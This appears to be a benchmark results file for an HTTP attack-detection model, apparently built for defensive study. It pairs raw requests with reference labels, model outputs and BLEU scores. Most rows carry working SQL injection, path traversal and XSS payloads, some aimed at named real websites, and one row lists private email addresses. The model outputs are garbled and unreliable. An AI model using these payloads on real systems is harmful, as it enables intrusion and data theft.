payload,reference_text,candidate_text,bleu_score
"GET / notice / Notice / notice _ view /? f _ content _ num = 382 & search _ key = & search _ val = UNION ALL SELECT 80, 80, 80, 80, 80, 80, 80, 80, 80, 80, 80, CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 112 ) | | CHR ( 120 ) | | CHR ( 113 ) | | CHR ( 122 ) | | CHR ( 120 ) | | CHR ( 97 ) | | CHR ( 78 ) | | CHR ( 105 ) | | CHR ( 111 ) | | CHR ( 103 ) | | CHR ( 82 ) | | CHR ( 86 ) | | CHR ( 113 ) | | CHR ( 80 ) | | CHR ( 81 ) | | CHR ( 84 ) | | CHR ( 76 ) | | CHR ( 116 ) | | CHR ( 117 ) | | CHR ( 98 ) | | CHR ( 66 ) | | CHR ( 82 ) | | CHR ( 108 ) | | CHR ( 74 ) | | CHR ( 116 ) | | CHR ( 98 ) | | CHR ( 82 ) | | CHR ( 107 ) | | CHR ( 80 ) | | CHR ( 66 ) | | CHR ( 88 ) | | CHR ( 89 ) | | CHR ( 121 ) | | CHR ( 110 ) | | CHR ( 102 ) | | CHR ( 71 ) | | CHR ( 73 ) | | CHR ( 100 ) | | CHR ( 106 ) | | CHR ( 75 ) | | CHR ( 67 ) | | CHR ( 120 ) | | CHR ( 107 ) | | CHR ( 113 ) | | CHR ( 122 ) | | CHR ( 118 ) | | CHR ( 120 ) | | CHR ( 113 ) FROM DUAL - - - & per _ page = HTTP / 1. 1 \ r \ nAccept - Language : en - us, en ; q = 0. 5 \ r \ nAccept - Encoding : gzip, deflate \ r \ nHost : isrc. or. kr \ r \ nAccept : text / html, application / xhtml + xml, application / xml ; q = 0. 9, * / * ; q = 0. 8 \ r \ nUser - Agent : Mozilla / 5. 0 ( X11 ; U ; Linux i686 ; en - US ) AppleWebKit / 533. 3 ( KHTML, like Gecko ) Chrome / 5. 0. 358. 0 Safari / 533. 3 \ r \ nAccept - Charset : I","Label : 1 Attack Syntax : UNION ALL SELECT 80, 80, 80, 80, 80, 80, 80, 80, 80, 80, 80, CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 112 ) | | CHR ( 120 ) | | CHR ( 113 ) | | CHR ( 122 ) | | CHR ( 120 ) | | CHR ( 97 ) | | CHR ( 78 ) | | CHR ( 105 ) | | CHR ( 111 ) | | CHR ( 103 ) | | CHR ( 82 ) | | CHR ( 86 ) | | CHR ( 113 ) | | CHR ( 80 ) | | CHR ( 81 ) | | CHR ( 84 ) | | CHR ( 76 ) | | CHR ( 116 ) | | CHR ( 117 ) | | CHR ( 98 ) | | CHR ( 66 ) | | CHR ( 82 ) | | CHR ( 108 ) | | CHR ( 74 ) | | CHR ( 116 ) | | CHR ( 98 ) | | CHR ( 80 ) | | CHR ( 107 ) | | CHR ( 89 ) | | CHR ( 121 ) | | CHR ( 110 ) | | CHR ( 102 ) | | CHR ( 71 ) | | CHR ( 73 ) | | CHR ( 100 ) | | CHR ( 106 ) | | CHR ( 75 ) | | CHR ( 67 ) | | CHR ( 120 ) | | CHR ( 107 ) | | CHR ( 113 ) | | CHR ( 122 ) | | CHR ( 118 ) | | CHR ( 120 ) | | CHR ( 113 ) FROM DUAL - - Attack Type : SQL Injection","Label : 1 Attack Syntax : UNION ALL SELECT 80 , 80 , 80 80 80 80 80 , 80 , 80 80 80 80 80 80 80 80 80 113 113 113 ( 113 | | | | ) | | | | | | | | | | | ) | | | CHR CHR ) | | | CHR ( ) | | | CHR ( ) | | | ( ( ) | | | ( ( ) | | | | | ) | | | | | ) | | | | | ) | | | | | ) | | | ( ( ) | | | | ( ) | | | | | ) | | | | | ) | | | | ( ) | | | | ( ) | | | | ( ) | | | CHR ( ) ) | | CHR | ) | | | ( | ) | | CHR | | ) | | | | ( ) | | CHR ( | ) | | | | | ) | | | | | | | | | | | | | | | | | | | | | | | ) | | | | | ) | | | | | ) | | | ( | ) | | | ( ( ) ) | | | ( ) | | | ( | ) | | | ( | ) | | | | | ) | | CHR ( ( ) | | CHR CHR CHR ) ) | | CHR ( ) | | | ( CHR ) | | | CHR CHR ) ) | | CHR CHR ) ) | | CHR CHR ) ) | | CHR CHR ) | | | CHR ( ) ) | | ) | CHR",0.24783929538559157
".. ) < sesool @ naver. com >, \ t ( ) < qkdwnsdud10 @ gmail. com >, \ t ( ) < qhshgoekf @ gmail. com >, \ t ( ) < greensh66 @ naver. com >, \ t ( ) < eunpark701 @ naver. com >, \ t ( ) < svia1025 @ naver. com >, \ t ( ) < jordanjoa @ naver. com >, \ t ( ) < ljw812022 @ gmail. com >, \ t ( ) < jaelee @ assembly. go. kr >, \ t ( ) < 3040dream @ gmail. com >, \ t ( ) < akavvvv @ naver. com >, \ t ( ) < isoh626 @ nate. com >, \ t ( ) < fhguy0702 @ gmail. com >, \ t ( ) < sja0205 @ hotmail. com >, \ t ( ) < kellyruth2022 @ gmail. com >, \ t ( ) < hskh20 @ hanmail. net >, \ t ( ) < angela4515 @ naver. com >, \ t ( ) < dokssa02 @ hanmail. net >, \ t ( ) < onekorea2025 @ gmail. com >, \ t ( ) < gnfkaos3 @ naver. com >, \ t ( ) < onekorea2025 @ naver. com >, \ t ( ) < inhawjd @ gmail. com >, \ t ( ) < taehoshgh @ naver. com >, \ t ( ) < ewon33 @ gmail. com >, \ t ( ) < flute1128 @ assembly. go. kr >, \ t ( ) < ihd1001 @ naver. com >, \ t ( ) < naja33 @ naver. com >, \ t ( ) < lyshm1011 @ gmail. com >, \ t ( ) < uhyun1895 @ naver. com >, \ t ( ) < jsemail @ naver. com >, \ t ( ) < podoripapa @ gmail. com >, \ t ( ) < jupitersir @ naver.",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"GET / cs / career / getSurvey. jsp? fn =.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. / etc / passwd HTTP / 1. 1Host : repository. kopri. re. krUser - Agent : Mozilla / 5. 0 ( Macintosh ; Intel Mac OS X 10 _ 9 _ 3 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 35. 0. 1916. 47 Safari / 537. 36Connection : closeAccept : * / * Accept - Language : enAccept - Encoding : gzip",Label : 1 Attack Syntax :.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. / etc / passwd Attack Type : Path Traversal,Label : 1 Attack Syntax : . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . / Type : : :,0.02675716734126501
"GET / board / board _ write? code = < section + id = x + tabindex = 1 + onbeforeactivate = alert ( 1 ) > < / section > HTTP / 1. 1 Host : 10. 0. 20. 20 User - Agent : Mozilla / 5. 0 ( X11 ; Linux i686 ; rv : 60. 0 ) Gecko / 20100101 Firefox / 60. 0 Accept - Encoding : gzip, deflate Accept : text / html, application / xhtml + xml, application / xml ; q = 0. 9, * / * ; q = 0. 8 Connection : close Accept - Language : en - US, en ; q = 0. 5 DNT : 1 Upgrade - Insecure - Requests : 1",Label : 1 Attack Syntax : < section id = x tabindex = 1 onbeforeactivate = alert ( 1 ) > Attack Type : Cross - Site Scripting ( XSS ),Label : 1 Attack Syntax : div id id = tabindex = tabindex = = alert ( 1 ) > Attack ) : Cross - Site Scripting ( XSS ),0.5882661820461595
"GET / stats / search _ auto _ complete? keyword =? name = abc # < img + src = "" random. gif "" + onerror = alert ( 5397 ) > HTTP / 1. 1 Host : www. mall. shop User - Agent : Mozilla / 5. 0 ( X11 ; Linux x86 _ 64 ; rv : 91. 0 ) Gecko / 20100101 Firefox / 91. 0 Accept : application / json, text / javascript, * / * ; q = 0. 01 Accept - Language : en - US, en ; q = 0. 5 X - Requested - With : XMLHttpRequest Connection : keep - alive Referer : http : / / www. mall. shop / goods / new _ arrivals? page = 1 & searchMode = new _ arrivals & per = 40 & sorting = regist & filter _ display = lattice Cookie : mobileapp = N ; mobileapp = N ; shopReferer = ; marketplace = direct ; today _ view = a : 2 : { i : 0 ; i : 38 ; i : 1 ; i : 39 ; } Content - Length : 0","Label : 1 Attack Syntax : < img src = "" random. gif "" onerror = alert ( 5397 ) > Attack Type : Cross - Site Scripting ( XSS )","Label : 1 Attack Syntax : < img src = "" random . gif "" onerror onerror alert ( ) > > Type Type Cross Cross Site Scripting Scripting XSS ) )",0.43435774685693274
"GET / media / mediaView. do? c _ ctgry _ id = & c _ se _ id = & collection _ se = CS03 & ctgry _ dep = 1 & ctgry _ id = 598419 & digital = & digital _ all = & itm _ id = 597830 & page = 1 & real = & real _ all = /.. \.. \ WEB - INF \ web. xml & rowNum = 12 & s _ ctgry _ id = & ss _ ctgry _ id = HTTP / 1. 1 \ nReferer : http : / / archive. acc. go. kr / \ nCookie : JSESSIONID = hyx0Js8BbEoMzhRawtXT1rjTjZH5cBV0XwzIoqrnKi5RdUvUJqbXQLt3QWMmX1Oy. amV1c19kb21haW4vYXJjaGl2ZV9zZXJ2ZXI = \ nAccept : text / html, application / xhtml + xml, application / xml ; q = 0. 9, * / * ; q = 0. 8 \ nUser - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 73. 0. 3683. 103 Safari / 537. 36 \ nX - Akamai - CONFIG - LOG - DETAIL : true \ nTE : chunked ; q = 1. 0 \ nConnection : TE \ nAccept - Encoding : gzip \ nAkamai - Origin - Hop : 1 \ nVia : 1. 1 akamai. net ( ghost ) ( AkamaiGHost ) \ nX - Forwarded - For : 155. 159. 255. 233 \ nTrue - Client - IP : 155. 159. 255. 233 \ nHost : archive. acc. go. kr \ nPragma : no - cache \ nCache - Control : no - cache, max - age = 0 \ nConnection : keep - alive",Label : 1 Attack Syntax : /.. \.. \ WEB - INF \ web. xml Attack Type : Path Traversal,Label : 1 Attack Syntax : . . \ . . \ \ \ - \ web web . xml Type Type Path Traversal Traversal,0.2356370192487632
"GET / board / board _ view < audio + src + onloadstart = alert ( 45 ) >? http : / / 10. 0. 20. 20 / board / board _ view < audio + src + onloadstart = alert ( 45 ) >? code = welfare & no = HTTP / 1. 1 Accept - Encoding : gzip ; q = 1. 0, deflate ; q = 0. 6, identity ; q = 0. 3 Accept : * / * User - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; WOW64 ; rv : 56. 0 ) Gecko / 20100101 Firefox / 56. 0 Connection : keep - alive Host : 10. 0. 20. 20",Label : 1 Attack Syntax : < audio src onloadstart = alert ( 45 ) > Attack Type : Cross - Site Scripting ( XSS ),Label : 1 Attack Syntax : < + + = Attack ) : : - Site Scripting Scripting XSS ),0.30759468938211515
"http : / / - ip - : - port - / dvwa / instructions. php / dvwa / instructions. php? doc = - 4618 ) / * * / OR / * * / 9835 = CONCAT ( CHAR ( 113 ) + CHAR ( 122 ) + CHAR ( 106 ) + CHAR ( 106 ) + CHAR ( 113 ), ( SELECT / * * / ( CASE / * * / WHEN / * * / ( 9835 = 9835 ) / * * / THEN / * * / CHAR ( 49 ) / * * / ELSE / * * / CHAR ( 48 ) / * * / END ) ), CHAR ( 113 ) + CHAR ( 107 ) + CHAR ( 120 ) + CHAR ( 98 ) + CHAR ( 113 ) ) - - / * * / HkbH sqlmap / 1. 5. 1. 40 # dev ( http : / / sqlmap. org ) PHPSESSID = jlpd56fppfes3q8njmedlrscgq ; security = impossible,","Label : 1 Attack Syntax : http : / / - ip - : - port - / dvwa / instructions. php / dvwa / instructions. php? doc = - 4618 ) / * * / OR / * * / 9835 = CONCAT ( CHAR ( 113 ) + CHAR ( 122 ) + CHAR ( 106 ) + CHAR ( 106 ) + CHAR ( 113 ), ( SELECT / * * / ( CASE / * * / WHEN / * * / ( 9835 = 9835 ) / * * / THEN / * * / CHAR ( 49 ) / * * / ELSE / * * / CHAR ( 48 ) / * * / END ) ), CHAR ( 113 ) + CHAR ( 107 ) + CHAR ( 120 ) + CHAR ( 98 ) + CHAR ( 113 ) ) - - / * * / H Attack Type : SQL Injection",Label : 1 Attack Syntax : http : / / - ip - : - port - / dvwa / instructions . php / dvwa / instructions . php ( doc = - ) ) / ) * / OR / * * / / = ) ( CHAR ( 113 ) + CHAR ( * ) + CHAR ( * ) + CHAR ( 106 ) + CHAR ( 113 ) + ( SELECT / * * / ( CASE / * * / WHEN / * * / ( CHAR ELSE / ) / * * / THEN / * * CHAR CHAR ( 49 ) / * * / CHAR / + * / CHAR ( 48 ) ( * CHAR / END ) ) ) +,0.545927107678285
"GET / html / popup / popup _ 01. jsp? & langCd = 1 & menuId = 0080002300 & reservDD = 01 & reservMM = 01 & reservName =.. /.. /.. /.. /.. /.. /.. /.. /.. /.. / windows / win. ini & reservPhone1 = 555 - 666 - 0606 & reservPhone2 = 555 - 666 - 0606 & reservPhone3 = 555 - 666 - 0606 & reservSex = 0 & reservYY = 2021 HTTP / 1. 1 \ r \ nReferer : http : / / www. mmca. go. kr / \ r \ nCookie : JSESSIONID = 6oaryRcz9daWK6xfosxLF1r8xsSm03aTX0Ku4WVFlIU91uWFJbZGd0OoXbAUSmTo. mocaweb _ servlet _ engine7 ; CID = null \ r \ nAccept : text / html, application / xhtml + xml, application / xml ; q = 0. 9, * / * ; q = 0. 8 \ r \ nAccept - Encoding : gzip, deflate \ r \ nHost : www. mmca. go. kr \ r \ nUser - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 73. 0. 3683. 103 Safari / 537. 36 \ r \ nConnection : Keep - alive",Label : 1 Attack Syntax :.. /.. /.. /.. /.. /.. /.. /.. / windows / win. ini Attack Type : Path Traversal,Label : 1 Attack Syntax : . . / . . / . . / . . / . . / . . / . . / . . / windows . / . . . windows / Path Traversal Traversal,0.11741875763815225
"GET / MjAyMzA1MTVfMTM4 / MDAxNjg0MTMxMzUyMTM0. U3cJkf16mearh14MM70AKBHguf5n4pdK - 8hwjRF8gqUg. v - zOmE3 - 49RPZx2fLsQRpRfJ2pMc1EshSQTGFYkWmpIg. JPEG / 2249555 - adec472f - 11af - 4b37 - a036 - d45d297fc63d. jpg HTTP / 1. 1 Host : searchad - phinf. pstatic. net Connection : keep - alive sec - ch - ua : "" Not. A / Brand "" ; v = "" 8 "", "" Chromium "" ; v = "" 114 "", "" Google Chrome "" ; v = "" 114 "" sec - ch - ua - mobile :? 0 User - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 114. 0. 0. 0 Safari / 537. 36 sec - ch - ua - platform : "" Windows "" Accept : image / avif, image / webp, image / apng, image / svg + xml, image / *, * / * ; q = 0. 8 Sec - Fetch - Site : cross - site Sec - Fetch - Mode : no - cors Sec - Fetch - Dest : image Referer : https : / / search. naver. com / search. naver? sm = tab _ sug. top & where = nexearch & query = + 드 + & oquery = & tqi = i47NzlprvN8ssLjTkBlssssstL4 - 102083 & acq = & acr = 1 & qdt = 0 Accept - Encoding : gzip, deflate, br Accept - Language : ko - KR, ko ; q = 0. 9, en - US ; q = 0. 8, en ; q = 0. 7",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"GET / oceangrid / cmm / proxyRun. do? call = wms & LAYERS = geotwo _ postgis : og _ rcm _ gm _ mdc _ view & CQL _ FILTER = cre _ year > = 2020 AND cre _ year < = 2020 AND date _ type ='hours'& SERVICE = WMS & REQUEST = GetMap & FORMAT = image / png & VERSION = 1. 3. 0 & EXCEPTIONS = text / xml & TRANSPARENT = TRUE & STYLES = & CRS = EPSG : 900913 & BBOX = 14252217. 835068, 4144981. 4748019, 14257312. 840734, 4146794. 4655663 & WIDTH = 2133 & HEIGHT = 759 HTTP / 1. 1Accept : image / png, image / svg + xml, image / jxr, image / * ; q = 0. 8, * / * ; q = 0. 5Referer : http : / / www. khoa. go. kr / oceangrid / gis / category / observe / observeSearch. do? type = EYSAccept - Language : ko - KRUser - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; WOW64 ; Trident / 7. 0 ; rv : 11. 0 ) like GeckoAccept - Encoding : gzip, deflateHost : www. khoa. go. krConnection : Keep - AliveCookie : JSESSIONID = xXisWWoaa8OL0rY9votxGFkAJgqDtRd6r92xd8nTzN0tsmwkbKEv14MSv1qIeAhn. UEtIT0Evb2NlYW5ncmlkMjE = ; JSESSIONID = aoYzo1S049vJjD9nTtPzjH10paMIAQwRrSqlkWVef7FWaBXib414wULjzR7NG5a1. UEtIT0EvS0hPQURFVjEx ; SCOUTER = x4hp7pqo2002ai ; WMONID = Gjou0Sz0BDK ; PCID = 74e5af00 - 9555 - 45b1 - a5d6 - 5bb9e1337a69 - 1661856133414",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"GET / cop / bbs / view / B0000153 / 1210329. do? statisMenuNo = 200911'AND 8616 = 2227 AND'rNac'='rNac HTTP / 1. 1 \ r \ nCache - Control : no - cache \ r \ nUser - Agent : Mozilla / 5. 0 ( X11 ; U ; Linux x86 _ 64 ; en - US ; rv : 1. 9. 1 ) Gecko / 20090630 Firefox / 3. 5 GTB6 \ r \ nReferer : http : / / kocca. kr : 80 / cop / bbs / view / B0000153 / 1210329. do \ r \ nHost : kocca. kr \ r \ nCookie : KCSESSIONID = ppSGgkFBfnL1SvSDth548nvym1pGh4y7Lx3LMbSz2R2lVVZC3gS1! 385399486! - 368784361 \ r \ nAccept : * / * \ r \ nAccept - Encoding : gzip, deflate \ r \ nConnection : close",Label : 1 Attack Syntax : AND 8861 = 2227 AND'rNac'='rNac Attack Type : SQL Injection,Label : 1 Attack Syntax : AND AND = 3145 Attack Type : ' Attack Attack Type : SQL,0.4489771072202117
"GET / sunny? src = http : / / lsig. kro. kr / favicon. ico & type = f30 _ 30 _ png _ expire24 HTTP / 1. 1 Host : search. pstatic. net Connection : keep - alive sec - ch - ua : "" Google Chrome "" ; v = "" 113 "", "" Chromium "" ; v = "" 113 "", "" Not - A. Brand "" ; v = "" 24 "" sec - ch - ua - mobile :? 0 User - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 113. 0. 0. 0 Safari / 537. 36 sec - ch - ua - platform : "" Windows "" Accept : image / avif, image / webp, image / apng, image / svg + xml, image / *, * / * ; q = 0. 8 Sec - Fetch - Site : cross - site Sec - Fetch - Mode : no - cors Sec - Fetch - Dest : image Referer : https : / / search. naver. com / search. naver? where = nexearch & sm = top _ hty & fbm = 0 & ie = utf8 & query = HSK + Accept - Encoding : gzip, deflate, br Accept - Language : ko - KR, ko ; q = 0. 9, en - US ; q = 0. 8, en ; q = 0. 7",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
GET / ssl _ test. html? gname = & pl = 230813 & version = 20230616 _ 1 HTTP / 1. 1 Host : sslvav. ncsc. go. kr User - Agent : curl / 7. 83. 1 Accept : * / *,Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"http : / / - ip - : - port - / dvwa / instructions. php / dvwa / instructions. php? doc = PDF'; %'/ * * / OR / * * / UPDATEXML ( 2942, CONCAT % 2 - port - x2e, 0x7178626b71, ( SELECT / * * / ( ELT ( 2942 = 2942, 1 ) ) ), 0x7162627a71 ), 9571 ) / * * / AND / * * /'SwxH %'='SwxH sqlmap / 1. 5. 1. 40 # dev ( http : / / sqlmap. org ) security = impossible ;,","Label : 1 Attack Syntax : http : / / - ip - : - port - / dvwa / instructions. php / dvwa / instructions. php? doc = PDF'; %'/ * * / OR / * * / UPDATEXML ( 2942, CONCAT % 2 - port - x2e, 0x7178626b71, ( SELECT / * * / ( ELT ( 2942 = 2942, 1 ) ) ), 0x7162627a71 ), 9571 ) / * * / AND / * * /'SwxH %'='SwxH Attack Type : SQL Injection","Label : 1 Attack Syntax : http : / / - ip - : - port - / dvwa / instructions . php / dvwa / instructions . php ? doc = PDF ' ; % ' / * * / OR / * * / EXTRACTVALUE ( 8999 , CONCAT % 2 - port - x5c , 0x7178626b71 , ( SELECT / * * / ( ELT ( ( = 8999 , ) ) ) ) , 0x716b786271 ) , 6025 ) / * * / AND / * * / ' ' % ' = ' ' Attack Type : SQL Injection",0.5028137464278898
"GET / servlets / org / front / board / action / board?, nd = CONTENT "" ) ) AS PSvS WHERE 8608 = 8608 OR NOT 6382 = 5872 - - FmDd & listcount = 10 & curpage = 1 & orderby = & direction = & board = notice & board _ seq = 8669 & b _ cate = & b _ search = HTTP / 1. 1 \ r \ nCache - Control : no - cache \ r \ nUser - Agent : Mozilla / 5. 0 ( Macintosh ; U ; PPC Mac OS X ; sv - se ) AppleWebKit / 312. 5. 2 ( KHTML, like Gecko ) Safari / 312. 3. 3 \ r \ nReferer : http : / / koreatta. sports. or. kr : 80 / servlets / org / front / board / action / board \ r \ nHost : koreatta. sports. or. kr \ r \ nCookie : JSESSIONID = 687E670FA15545C67CAC389EA80390E0 \ r \ nAccept : * / * \ r \ nAccept - Encoding : gzip, deflate \ r \ nConnection : close",Label : 1 Attack Syntax : OR NOT 6382 = 5872 - - FmDd Attack Type : SQL Injection,Label : 1 Attack Syntax : OR = = = AND ) = = = = = = : Attack Attack Attack : : SQL,0.2668730618874673
"http : / / - ip - : - port - / dvwa / instructions. php'/ * * / AND / * * / 4790 = CAST ( ( CHR ( 113 ) | | CHR ( 122 ) | | CHR ( 106 ) | | CHR ( 106 ) | | CHR ( 113 ) ) | | ( SELECT / * * / ( CASE / * * / WHEN / * * / ( 4790 = 4790 ) / * * / THEN / * * / 1 / * * / ELSE / * * / 0 / * * / END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 107 ) | | CHR ( 120 ) | | CHR ( 98 ) | | CHR ( 113 ) ) / * * / AS / * * / NUMERIC ) - - / * * / Rdfo / dvwa / instructions. php? doc = 1 sqlmap / 1. 5. 1. 40 # dev ( http : / / sqlmap. org ) PHPSESSID = jlpd56fppfes3q8njmedlrscgq ; security = impossible,",Label : 1 Attack Syntax : AND 4790 = CAST ( ( CHR ( 113 ) | | CHR ( 122 ) | | CHR ( 106 ) | | CHR ( 106 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 4790 = 4790 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 107 ) | | CHR ( 120 ) | | CHR ( 98 ) | | CHR ( 113 ) ) AS NUMERIC ) - - R Attack Type : SQL Injection,Label : 1 Attack Syntax : http : / / - ip - : - port - / dvwa / instructions . php ' / * * / AND / * * / 9159 = CAST ( ( CHR ( 113 ) | | CHR ( 122 ) | | CHR ( 106 ) | | CHR ( 106 ) | | CHR ( 113 ) ) | | ( SELECT / * * / ( CASE / * * / WHEN / * * / ( 3362 = 9159 ) / * * / THEN / * * / 1 / * * / ELSE / * * / 0 / * * / END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 107 ) | | CHR ( 120 ) | | CHR ( 98 ) | | CHR ( 113 ) ) / * * / AS / * * / NUMERIC ) - - / * * / / CHR Attack Type : SQL Injection,0.4853378484797881
"http : / / - ip - / dvwa / vulnerabilities / brute / / dvwa / vulnerabilities / view _ help. php? id = brute < script > alert ( 1410 ) < / script > & security = impossible Mozilla / 5. 0 ( Windows NT 6. 1 ; WOW64 ; Trident / 7. 0 ; rv : 11. 0 ) like Gecko security = impossible ; PHPSESSID = bv53361rm8kfr5272v9bu9cicj,",Label : 1 Attack Syntax : < script > alert ( 1410 ) < / script > Attack Type : Cross - Site Scripting ( XSS ),Label : 1 Attack Syntax : http dvwa / / - ip - < / script ) / Type / / dvwa / php / view ? < script > alert ( ) < < > > security impossible Attack Type : Cross - Site XSS,0.31623503269728204
"GET / collection / collectionList. do? character = - 1 & http : / / archive. acc. go. kr / collection / collectionList. do = undefined & langType =.. /.. /.. /.. /.. /.. / WEB - INF / web. xml & page = 1 HTTP / 1. 1 \ r \ nReferer : http : / / archive. acc. go. kr / \ r \ nCookie : JSESSIONID = hyx0Js8BbEoMzhRawtXT1rjTjZH5cBV0XwzIoqrnKi5RdUvUJqbXQLt3QWMmX1Oy. amV1c19kb21haW4vYXJjaGl2ZV9zZXJ2ZXI = \ r \ nAccept : text / html, application / xhtml + xml, application / xml ; q = 0. 9, * / * ; q = 0. 8 \ r \ nUser - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 73. 0. 3683. 103 Safari / 537. 36 \ r \ nX - Akamai - CONFIG - LOG - DETAIL : true \ r \ nTE : chunked ; q = 1. 0 \ r \ nConnection : TE \ r \ nAccept - Encoding : gzip \ r \ nAkamai - Origin - Hop : 1 \ r \ nVia : 1. 1 akamai. net ( ghost ) ( AkamaiGHost ) \ r \ nX - Forwarded - For : 155. 159. 255. 233 \ r \ nTrue - Client - IP : 155. 159. 255. 233 \ r \ nHost : archive. acc. go. kr \ r \ nPragma : no - cache \ r \ nCache - Control : no - cache, max - age = 0 \ r \ nConnection : keep - alive",Label : 1 Attack Syntax :.. /.. /.. /.. /.. /.. / WEB - INF / web. xml Attack Type : Path Traversal,Label : 1 Attack Syntax : . . / . . / . . / . . . . . / . - / WEB . / . . . Path Traversal Path,0.1448218930239774
"GET / rpc. php? q = \ \ \ "" > < script > alert ( document. cookie ) < / script > HTTP / 1. 1 Content - Type : application / x - www - form - urlencoded Content - Length : 57 Host : 10. 0. 20. 20 Connection : Keep - Alive User - Agent : Mozilla / 5. 00 ( Nikto / 2. 1. 6 ) ( Evasions : None ) ( Test : 003497 ) method = open + service : 3. 0. 2. 1105 & service _ name = /","Label : 1 Attack Syntax : \ \ \ "" > < script > alert ( document. cookie ) < / script > Attack Type : Cross - Site Scripting ( XSS )","Label : 1 Attack Syntax : "" \ < < > script > ? - - < < ) ) > > Attack Type Cross Cross - Site Scripting ( XSS )",0.3938037937090336
